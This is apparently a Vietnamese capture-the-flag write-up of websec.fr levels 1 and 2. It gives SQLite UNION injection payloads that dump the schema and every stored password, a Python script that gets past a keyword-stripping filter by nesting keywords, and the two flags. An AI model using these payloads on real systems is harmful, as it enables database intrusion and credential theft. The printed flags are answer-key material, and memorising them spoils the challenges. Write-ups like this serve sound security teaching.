<!-- markdownlint-disable MD024 -->
# Websec

## Level 01

> Nothing fancy
>
> 🔥 <https://websec.fr/level01/>

Tại level 1 này, chúng ta sẽ bắt đầu với một thử thách SQL Injection đơn giản.

Ứng dụng sẽ lấy `id` chúng ta nhập vào và trả về username cũng như id tương ứng.

![image](images/level-01/image-1.png)

Nếu chúng ta nhập vào `1'` sẽ thấy lỗi xuất hiện. Từ đó cho ta biết server đang sử dụng SQLite và giá trị của `id` đang được truyền thẳng vào câu truy vấn.

![image](images/level-01/image-2.png)

Vậy chúng ta có thể sử dụng payload như sau để xác định phiên bản của SQLite.

```sql
1 UNION SELECT null, sqlite_version();
```

![image](images/level-01/image-3.png)

Với phiên bản là `3.27.2`, chúng ta sẽ sử dụng payload sau để biết được cấu trúc của database.

```sql
1 UNION SELECT null, sql FROM sqlite_master
```

![image](images/level-01/image-4.png)

Vậy là câu truy vấn gốc không lấy ra giá trị từ cột `password`, chúng ta sẽ tận dụng SQL Injection để thực hiện điều đó.

Với `id` là `1` thì chúng ta sẽ lấy được password chứa flag.

```sql
1 UNION SELECT null, password FROM users WHERE id=1
```

![image](images/level-01/image-5.png)

Ngoài ra, chúng ta cũng có thể sử dụng payload sau để lấy hết tất cả password có trong bảng `users`.

```sql
1 UNION SELECT null, group_concat(password) FROM users
```

### Flag

`WEBSEC{Simple_SQLite_Injection}`

## Level 02

> Nothing fancy, with a twist
>
> 🔥 <https://websec.fr/level02/>

![image](images/level-02/image-1.png)

Sang tới level 2 này, lập trình viên đã thay thế các từ `union`, `order`, `select`, `from`, `group`, `by` (không phân biệt hoa thường) thành chuỗi rỗng `''`.

![image](images/level-02/image-2.png)

Vậy chúng ta có thể tạo thành từ `UNION` bằng cách sử dụng `UbyNION`, những từ khoá khác cũng tạo tương tự.

Mình đã viết một script Python bên dưới để lấy flag.

```python
import requests
import re

URL = "https://websec.fr/level02/index.php"

payload = "1 UbyNION SbyELECT null, password FbyROM users where id=1"

def solve():
    data = {
        "user_id": f"{payload}",
        "submit": ""
    }

    r = requests.post(URL, data=data)
    flag = re.search(r"WEBSEC{\w*}", r.text).group(0)

    print(flag)


if __name__ == "__main__":
    solve()

```

### Flag

`WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}`
